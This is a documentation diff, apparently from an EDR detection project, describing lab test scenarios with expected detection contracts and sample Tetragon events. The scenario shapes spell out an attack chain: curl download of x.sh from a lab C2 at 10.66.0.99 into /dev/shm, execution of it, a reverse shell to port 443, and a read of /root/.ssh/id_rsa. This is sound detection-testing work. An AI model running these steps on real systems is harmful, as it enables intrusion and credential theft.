@@ -1,86 +1,357 @@
-# 测试场景输入输出
+# SysArmor Scenario Contracts
 
-每个场景的完整数据流:什么进去了,什么出来了,长什么样。
+`scenarios/` 定义功能场景的输入和期望输出。它和 `workloads/` 的边界很重要:
 
-## 输入
+- `scenarios/` 是安全/功能契约,带攻击或良性语义,必须断言 Event、Signal、Incident、Evidence 或负向条件;
+- `workloads/` 是压力源,用于性能评估,不直接声明安全结论。
 
-### 环境输入 (env/)
+每个场景目录通常包含:
 
-| 输入 | 位置 | 作用 |
+```text
+test/scenarios/<topology>/<scenario>/
+├── attack.sh        scenario input, executed inside node-a
+└── expected.yaml    expected output contract
+```
+
+容器拓扑通常通过 `docker exec node-a ...` 触发。VM 拓扑通常通过 `vagrant ssh node-a ...` 触发。两种拓扑应尽量产出结构一致的 Event/Signal/Incident。
+
+## Scenario Matrix
+
+| Scenario | Type | Core Question | Expected |
+|---|---|---|---|
+| `apt-fileless-c2` | positive attack | 单 lineage 内的下载、执行、反弹 shell、凭据读取能否被端侧串起来 | endpoint terminal signal, incident=1 |
+| `apt-staged-drop` | positive cross-lineage attack | 落盘和执行分属不同 lineage 时,云端 provenance graph 能否缝合 | endpoint terminal=0, incident=1 |
+| `benign-ci-noise` | negative benign baseline | curl、编译、写 artifact 与攻击形态相似时是否不误报 | incident=0 |
+| `lifecycle-smoke` | lifecycle smoke | agent 注册、policy、基础事件可见性是否正常 | agent visible, events visible |
+
+这三个安全场景构成最小完备集:
+
+```text
+apt-fileless-c2  -> 正向检出:有攻击应响
+apt-staged-drop  -> 横向能力:跨 lineage 才能成案
+benign-ci-noise  -> 负向基线:相似良性行为不应误报
+```
+
+## Common Inputs
+
+### Environment
+
+| Input | Location | Role |
 |---|---|---|
-| compose.yaml | env/container/ | 声明 4 容器 (attacker 10.66.0.99 / node-a .11 / mgr .10 / tetragon) + sysarmor-net |
-| Vagrantfile | env/vm/ | 声明 3 VM (同 IP 分配) |
-| Dockerfile ×3 | env/container/images/ | attacker: C2 服务; node-a: web 运行时+CI+假凭据; mgr: 预留 |
-| provision 脚本 | env/vm/provision/ | setup-c2.sh / setup-credentials.sh；agent 与 Tetragon sensor 由 `deployments/install-agent.sh` 安装 |
-| TracingPolicy | env/resources/syscall-capture.yaml | replay/debug/perf 兼容的 tetragon 采集策略 |
-| 假凭据 | env/resources/registry-token | 植入 node-a 的假 SA token |
+| container compose | `test/env/container/compose.yaml` | attacker/node-a/mgr/tetragon Docker topology |
+| VM topology | `test/env/vm/Vagrantfile` | attacker/node-a VM topology |
+| container images | `test/env/container/images/` | attacker C2, node-a workload host, mgr image |
+| VM provision | `test/env/vm/provision/` | C2 setup, credentials setup |
+| tracing policy | `test/env/resources/syscall-capture.yaml` | replay/debug/perf compatible Tetragon policy |
+| fake token | `test/env/resources/registry-token` | benign/credential test material |
 
-### TracingPolicy 详情
+### Policy And Content
+
+Scenario assertions may use local generated policies, collection policy files from `test/policies/`, and content packs from `test/content/`.
+
+Important collection profiles:
+
+| Policy | Purpose |
+|---|---|
+| `collection-minimal-high-signal.json` | low-cost high-confidence surface |
+| `collection-edr-balanced.json` | default long-running EDR surface |
+| `collection-incident-deep.json` | short-lived investigation surface |
+| `collection-debug-wide.json` | broad debug/capability surface |
+
+Important content packs:
+
+```text
+context-credential-path-prefixes.json
+context-payload-path-prefixes.json
+context-persistence-path-prefixes.json
+context-secret-volume-prefixes.json
+ioc-c2-ip-feed.json
+ioc-c2-port-feed.json
+rulepack-cep-endpoint.json
+```
+
+### Legacy TracingPolicy Shape
+
+`test/env/resources/syscall-capture.yaml` is still useful for replay/debug/perf-compatible paths. It focuses on network connect and sensitive file read:
 
 ```yaml
-# env/resources/syscall-capture.yaml
 spec:
   kprobes:
-  - call: "security_socket_connect"     # 网络外联 (T1571 C2 回连)
+  - call: "security_socket_connect"
     args: [sockaddr, int]
-    selectors: [AF_INET / AF_INET6]
 
-  - call: "security_file_permission"    # 凭据/敏感文件读 (T1552)
+  - call: "security_file_permission"
     return: true
     args: [file, int]
-    selectors:
-      - matchArgs: [Prefix: "/root/.ssh", "/var/run/secrets", "/etc/passwd"]
 ```
 
-即:tetragon 只采集两类内核事件 -- **connect**(谁连了哪)和 **file_read**(谁读了敏感文件)。
-加上自动采集的 process_exec/process_exit(进程谱系),构成 Event 三轴:
-process lineage / network socket / credential file。
+Together with process exec/exit, this gives the basic behavior axes:
 
-### 场景输入 (scenarios/)
+```text
+process lineage
+network socket
+credential / sensitive file
+```
 
-| 场景 | attack.sh 做什么 | 触发方式 |
+The newer agent-owned path compiles collection policies into runtime sensor intent, but the same scenario semantics should remain stable.
+
+## Scenario Details
+
+### apt-fileless-c2
+
+Shape:
+
+```text
+java-web or shell entry
+  -> bash
+  -> curl http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh
+  -> bash /dev/shm/x.sh
+  -> reverse shell to 10.66.0.99:443
+  -> cat /root/.ssh/id_rsa
+```
+
+Security meaning:
+
+- fileless/staged execution from temporary memory-backed path;
+- C2 download and reverse shell;
+- sensitive credential read;
+- one lineage contains enough evidence for endpoint detection.
+
+Expected contract:
+
+```text
+events:
+  must include CONNECT 10.66.0.99:8080
+  must include CONNECT 10.66.0.99:443
+  should include sensitive file read when policy enables it
+
+endpoint_signals:
+  must include reverse_shell_pattern
+  terminal=true
+
+incident:
+  count=1
+```
+
+Typical lineage:
+
+```text
+entrypoint/init
+  -> bash
+  -> curl 10.66.0.99:8080/x.sh
+  -> bash /dev/shm/x.sh
+  -> bash -i / reverse shell
+  -> cat /root/.ssh/id_rsa
+```
+
+### apt-staged-drop
+
+Shape:
+
+```text
+lineage A:
+  bash
+    -> curl http://10.66.0.99:8080/helper
+    -> write /var/lib/app/plugins/helper
+
+GAP
+
+lineage B:
+  /var/lib/app/plugins/helper --report 10.66.0.99:443
+```
+
+Security meaning:
+
+- download/write and later execution are intentionally split;
+- a single endpoint lineage should not be enough to produce a terminal conclusion;
+- cloud/provenance graph should connect the two lineages via the shared file node.
+
+Expected contract:
+
+```text
+events:
+  must include helper download
+  must include helper execution or report connection
+
+endpoint_signals:
+  may include non-terminal payload/drop signals
+  should not require a terminal endpoint-only chain
+
+incident:
+  count=1
+  lineage_ids >= 2
+  evidence contains /var/lib/app/plugins/helper
+
+control_assertions:
+  disabling cloud.cross_lineage should make incident count 0
+```
+
+Typical graph:
+
+```text
+curl -> /var/lib/app/plugins/helper <- helper execution -> 10.66.0.99:443
+```
+
+### benign-ci-noise
+
+Shape:
+
+```text
+CI/build loop x N:
+  bash build.sh
+    -> curl 10.66.0.99:8080 dependencies
+    -> compile
+    -> write artifact
+```
+
+Security meaning:
+
+- behavior intentionally resembles attack building blocks: curl, file writes, process churn;
+- repeated benign structure should reduce rarity and avoid incident creation;
+- useful as false-positive and business-noise baseline.
+
+Expected contract:
+
+```text
+events:
+  may include repeated curl/connect and file activity
+
+endpoint_signals:
+  no terminal attack signal expected
+
+incident:
+  count=0
+
+control_assertions:
+  switching converge.mode=additive_threshold may produce incident>=1
+```
+
+This scenario is the main guard against a naive additive scoring model.
+
+### lifecycle-smoke
+
+Shape:
+
+```text
+start topology
+start or connect agent
+emit a small known event stream
+query agent/manager status and events
+```
+
+Expected contract:
+
+```text
+lifecycle:
+  agent_registered=true
+  events_visible=true
+  stable_id and lineage_id should exist where expected
+  no panic / no OOM
+```
+
+This scenario is not a security detection test. It is a path-health smoke test.
+
+## Expected YAML Contract
+
+`expected.yaml` is intentionally declarative. A typical file may contain:
+
+```yaml
+events:
+  must_contain:
+    - { kind: CONNECT, dst: "10.66.0.99:443" }
+
+endpoint_signals:
+  must_contain:
+    - { name: reverse_shell_pattern, terminal: true }
+
+cloud_signals:
+  must_contain:
+    - { name: staged_payload_chain }
+
+incident:
+  count: 1
+  lineage_ids_min: 2
+  converge_method: "rarity+causal-topk"
+
+negative:
+  endpoint_terminal_count: 0
+
+control_assertions:
+  - disable: cloud.cross_lineage
+    then_incident_count: 0
+```
+
+Current assertion layers:
+
+| Layer | What It Checks | Main Entrypoint |
 |---|---|---|
-| apt-fileless-c2 | `docker exec node-a` → curl 下载 x.sh → bash 执行 → 反弹 shell + 后渗透 | 容器: docker exec; VM: vagrant ssh |
-| apt-staged-drop | `docker exec node-a` → curl 下载 helper → sleep GAP → 执行 helper 连 C2 | 同上 |
-| benign-ci-noise | `docker exec node-a` → 循环 N 轮 build.sh (curl+编译+写 artifact) | 同上 |
+| L1 Events | raw/normalized event visibility | `capture-*.sh`, `assert.py`, `assert-vm-local.sh` |
+| L2 Endpoint signals | local endpoint rules and event refs | `assert-vm-local.sh`, `e2e-agent-*.sh` |
+| L3 Cloud signals | manager/analytics rule output | `assert.py`, manager e2e scripts |
+| L4 Incidents | convergence, evidence, lifecycle state | `e2e-incident-*.sh`, graph/evidence e2e |
+| Negative | absence of terminal signals or incidents | scenario expected files |
+| Control | counterfactual behavior when a capability is disabled | `control_assertions` |
 
-### PolicyEnvelope (policies/)
+`harness/assert.py` is the generic historical assertion entrypoint. Some newer and more reliable checks live in focused `harness/e2e-*.sh` scripts, especially for local VM agent paths, graph/evidence, response, agent session, and ControlStream behavior.
 
-6 个 PolicyEnvelope 是 sysarmor agent / manager 控制面的目标契约样例。当前 agent-managed runtime 已经存在,但完整 policy/rule content 下发、版本化、启停闭环还未完成。详见 `policies/README.md`。
+## Event And Signal Output
 
-| collection.yaml | 采集哪些事件种类 (EXEC/OPEN/CONNECT...) | 后续控制面下发采集意图时 |
-| detection.yaml | 检测规则 + 收敛参数 (rarity_structural, top_k=8) | 后续规则内容运营时 |
-| detection-additive.yaml | 对照档: additive_threshold (反模式,仅 benign-ci-noise 对照用) | 对照实验时 |
-| resource.yaml | 端侧资源上限 (RSS 512MB, lineage TTL 1min...) | 后续资源阈值门禁时 |
-| telemetry.yaml | 上行批处理/重试/优先级 | agent 上报配置运营时 |
-| response.yaml | 响应模式 (MVP 固定 OBSERVE) | response 审计闭环落地时 |
+Scenario and recorder output usually lands under `test/.results/`.
 
-详细说明见 `policies/README.md`。
+Functional outputs:
 
-与 TracingPolicy 的区别:TracingPolicy 是 tetragon 原生配置,用于 replay/debug/perf 兼容路径;
-PolicyEnvelope 是 agent/manager 层策略契约,定义"检测/收敛/资源/上行/响应"策略。当前 e2e 主路径会用脚本临时生成的最小 policy 验证 agent-managed runtime;完整 PolicyEnvelope 控制面仍待接入。
-
-## 输出
-
-### 采集输出
-
-```
-.results/
-├── <scenario>.container.tetragon.jsonl    容器拓扑事件流
-└── <scenario>.vm.tetragon.jsonl           VM 拓扑事件流
+```text
+test/.results/
+├── <topology>.<scenario>.events.ndjson
+├── <topology>.<scenario>.signals.ndjson
+├── <topology>.<scenario>.local.json
+├── <topology>.<scenario>.linked.json
+└── <topology>.<scenario>.json
 ```
 
-每行一个 JSON 事件,三种事件类型:
+Recorder/benchmark outputs:
 
-| 事件类型 | 含义 | 关键字段 |
+```text
+test/.results/recordings/<run-id>/
+├── timeline.csv
+├── markers.ndjson
+├── events.ndjson
+├── signals.ndjson
+└── summary.json
+
+test/.results/bench-collection-vm/<run-id>/
+├── matrix.csv
+├── matrix.json
+└── <policy-name>/
+    ├── summary.json
+    ├── timeline.csv
+    ├── events.ndjson
+    ├── signals.ndjson
+    ├── collection-apply.json
+    ├── workload.out
+    └── workload.err
+```
+
+Common raw Tetragon event shapes:
+
+| Raw type | Meaning | Important fields |
 |---|---|---|
-| process_exec | 进程启动 | exec_id, pid, binary, arguments, parent_exec_id, docker(容器ID) |
-| process_exit | 进程退出 | exec_id, pid |
-| process_kprobe | 内核探针 | function_name, args(sockaddr_arg/file_arg), policy_name |
+| `process_exec` | process start | `exec_id`, `pid`, `binary`, `arguments`, `parent_exec_id`, container/host metadata |
+| `process_exit` | process exit | `exec_id`, `pid` |
+| `process_kprobe` | kernel probe event | `function_name`, `args`, `policy_name` |
 
-### 事件样例
+Common normalized behavior axes:
 
-#### process_exec -- 进程谱系
+| Behavior | Example |
+|---|---|
+| process lineage | bash -> curl -> helper |
+| network connect | 10.66.0.99:8080 / 10.66.0.99:443 |
+| file write/chmod | `/dev/shm/x.sh`, `/var/lib/app/plugins/helper` |
+| file read | `/root/.ssh/id_rsa`, secret paths |
+
+## Example Raw Events
+
+Process lineage:
 
 ```json
 {
@@ -89,8 +360,7 @@ PolicyEnvelope 是 agent/manager 层策略契约,定义"检测/收敛/资源/上
       "exec_id": "MzYyMzZmZTY1ZjVmOjIxNDc4...",
       "pid": 16783,
       "binary": "/usr/bin/bash",
-      "arguments": "-c \"curl -s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh ...\"",
-      "docker": "8b5a7543aa5f21dbaceb131ccfe5f91",
+      "arguments": "-c \"curl -s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh\"",
       "parent_exec_id": "MzYyMzZmZTY1ZjVmOjEyNjM4..."
     },
     "parent": {
@@ -101,10 +371,7 @@ PolicyEnvelope 是 agent/manager 层策略契约,定义"检测/收敛/资源/上
 }
 ```
 
-exec_id → parent_exec_id 构成 **lineage 轴**(进程谱系)。
-docker 字段标识容器拓扑的 endpoint namespace。
-
-#### process_kprobe: security_socket_connect -- C2 外联
+Network connect:
 
 ```json
 {
@@ -112,9 +379,7 @@ docker 字段标识容器拓扑的 endpoint namespace。
     "process": {
       "pid": 16789,
       "binary": "/usr/bin/curl",
-      "arguments": "-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh",
-      "docker": "8b5a7543aa5f21dbaceb131ccfe5f91",
-      "parent_exec_id": "MzYyMzZmZTY1ZjVmOjIxNDc4..."
+      "arguments": "-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh"
     },
     "function_name": "security_socket_connect",
     "args": [
@@ -126,10 +391,7 @@ docker 字段标识容器拓扑的 endpoint namespace。
 }
 ```
 
-sockaddr_arg 给出 **C2 目标**(10.66.0.99:8080 = 下载; :443 = 反弹 shell)。
-parent_exec_id 回溯到 bash → entrypoint,构成攻击链。
-
-#### process_kprobe: security_file_permission -- 凭据读取
+Sensitive file read:
 
 ```json
 {
@@ -137,8 +399,7 @@ parent_exec_id 回溯到 bash → entrypoint,构成攻击链。
     "process": {
       "pid": 16804,
       "binary": "/usr/bin/cat",
-      "arguments": "/root/.ssh/id_rsa",
-      "docker": "8b5a7543aa5f21dbaceb131ccfe5f91"
+      "arguments": "/root/.ssh/id_rsa"
     },
     "function_name": "security_file_permission",
     "args": [
@@ -150,90 +411,71 @@ parent_exec_id 回溯到 bash → entrypoint,构成攻击链。
 }
 ```
 
-file_arg 给出 **敏感文件路径** + 权限。int_arg=4 = MAY_READ。
-return=0 表示读取成功。
+## Control Assertions
 
-### 各场景典型事件摘要
+Control assertions are counterfactual checks: if an important capability is disabled or swapped out, the result should change in a predictable way.
 
-**apt-fileless-c2** (54 process_exec + 32 kprobe,容器拓扑):
-
-```
-谱系:  entrypoint.sh → bash → curl 10.66.0.99:8080/x.sh
-                          → bash /dev/shm/x.sh → bash -i (反弹 shell)
-                                                    → cat /root/.ssh/id_rsa (后渗透)
-kprobe: security_socket_connect  curl → 10.66.0.99:8080     (下载)
-        security_socket_connect  bash → 10.66.0.99:443       (C2 回连)
-        security_file_permission cat  → /root/.ssh/id_rsa     (凭据窃取)
-```
-
-**apt-staged-drop** (19 process_exec + 18 kprobe,容器拓扑):
-
-```
-lineage A: bash → curl 10.66.0.99:8080/helper → 写入 /var/lib/app/plugins/helper
-           ──── 间隔 GAP 秒 (lineage A 过期) ────
-lineage B: bash → /var/lib/app/plugins/helper --report 10.66.0.99:443
-
-kprobe: security_socket_connect  curl → 10.66.0.99:8080      (下载)
-        security_socket_connect  bash → 10.66.0.99:443       (执行后回连)
-```
-
-端侧任一 lineage 都不完整;只有云端 provenance graph 经 `/var/lib/app/plugins/helper` 文件节点缝合才能成案。
-
-**benign-ci-noise** (43 process_exec + 48 kprobe,容器拓扑):
-
-```
-CI 轮次 ×N: bash build.sh → curl 10.66.0.99:8080 (拉依赖) → javac → 写 artifact
-
-kprobe: security_socket_connect  curl → 10.66.0.99:8080 ×6  (每轮都有)
-        security_file_permission (非敏感路径,不命中 TracingPolicy)
-```
-
-curl 外联模式与攻击完全相同,但 Incident 必须为 0 (罕见度随重复趋零,不会误报)。
-
-## 断言输出
-
-每个场景有 `expected.yaml` 契约,定义三層断言:
+Examples:
 
 ```yaml
-# 例子:apt-fileless-c2/expected.yaml
-events:                    # L1: 原始事件
-  must_contain:
-    - { kind: CONNECT, dst: "10.66.0.99:443" }
-
-endpoint_signals:          # L2: 端侧信号
-  must_contain:
-    - { name: reverse_shell_pattern, terminal: true }
-
-incident:                  # L3: 云端裁决
-  count: 1
-  converge_method: "rarity+causal-topk"
-
-negative:                  # 负向
-  endpoint_terminal_required: true
+# benign-ci-noise: naive additive scoring should false positive
+control_assertions:
+  - switch: "converge.mode=additive_threshold"
+    then_incident_count_min: 1
 ```
-
-| 层级 | 断言什么 | 当前状态 |
-|---|---|---|
-| events | manager 是否能查到指定 scenario 的事件 | 当前 e2e 已断言 |
-| endpoint_signals | agent/manager 是否产了指定 endpoint Signal + entities | 当前 container detection e2e 已断言核心信号 |
-| incident | 云端是否产了指定 Incident + 证据子图 | 当前 container detection e2e 已断言 incident 存在;完整 evidence graph lifecycle 待补 |
-
-`harness/assert.py` 仍偏历史通用断言入口;当前更可靠的 Signal/Incident 断言已经放在专门的 `harness/e2e-agent-*.sh` 脚本中,通过 `sysarmorctl` 查询 manager 结果。
-
-## control_assertions (对照实验)
-
-benign-ci-noise 和 apt-staged-drop 的 expected.yaml 含 `control_assertions`:
 
 ```yaml
-# benign-ci-noise
+# apt-staged-drop: cross-lineage graph is necessary
 control_assertions:
-  - switch: "converge.mode=additive_threshold"   # 切裸加
-    then_incident_count_min: 1                    # 裸加会误报
-
-# apt-staged-drop
-control_assertions:
-  - disable: cloud.cross_lineage                  # 关闭跨 lineage 缝合
-    then_incident_count: 0                         # 则不成案
+  - disable: cloud.cross_lineage
+    then_incident_count: 0
 ```
 
-这些是**反事实推理**:如果关掉某个能力,结果应该反转。用于证明该能力的必要性。
+These assertions are useful because they prove a feature is necessary, not just present.
+
+## Effectiveness And Efficiency
+
+Scenario results currently provide pass/fail functional evidence. Benchmarks provide phase-level efficiency metrics. The next useful step is to merge them into a scenario effectiveness matrix:
+
+```text
+required_event_hit_rate
+event_recall_by_kind
+signal_hit_rate
+terminal_signal_latency_ms
+incident_hit_rate
+incident_latency_ms
+false_positive_count
+drop_rate
+parse_error_rate
+cost_per_1k_events_cpu
+```
+
+That matrix should use:
+
+- scenario contracts from `expected.yaml`;
+- scoped event/signal frames from recorder output;
+- phase markers from `markers.ndjson`;
+- resource counters from `timeline.csv`;
+- benchmark rows from `matrix.csv`.
+
+This keeps scenario semantics, workload pressure, and resource cost comparable without mixing their implementation code.
+
+Current entrypoint:
+
+```bash
+make -C test effectiveness-report TOPO=vm RUN_ID=manual
+```
+
+When used after `make -C test bench-matrix-vm`, the report is written to:
+
+```text
+test/.results/effectiveness/<run-id>/
+├── summary.json
+├── matrix.csv
+├── policy_comparison.csv
+└── policy_comparison.json
+```
+
+`summary.json` keeps per-check details derived from `expected.yaml`. `matrix.csv` keeps one row per scenario/policy with required hit rate, event hit rate, signal hit rate, observed counts, drop/parse-error rates, CPU cost per 1k events, and historical assert pass/fail counts when available.
+
+`policy_comparison.csv` aggregates scenario effectiveness and workload resource cost per policy. It is the main table for comparing collection profiles as product options.
